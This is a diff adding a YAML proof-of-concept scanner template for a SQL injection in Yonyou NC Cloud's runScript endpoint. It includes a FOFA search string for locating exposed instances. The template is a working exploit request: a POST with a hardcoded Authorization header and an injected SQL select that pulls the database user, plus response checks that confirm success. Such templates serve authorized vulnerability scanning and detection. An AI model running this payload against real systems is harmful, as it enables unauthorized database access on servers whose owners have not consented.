@@ -1,0 +1,28 @@
+id: poc-yaml-yongyou-nc-cloud-runscript-sqli
+info:
+  name: 用友NC Cloud runScript SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友-NC-Cloud
+  fofa: app="用友-NC-Cloud"
+variables:
+  t1: random_int(100,1000)
+  t2: t1 * t1
+requests:
+- method: POST
+  path: /ncchr/attendScript/internal/runScript
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Authorization: 58e00466213416018d01d15de83b0198
+  data: key=1&script=select 1,{{.t1}}*{{.t1}},USER,4,5,6,7,8,9,10 from dual
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"USER\"") &&
+
+    contains(body,t2) &&
+
+    !contains(body,"<")
+
+    '
+transport: http
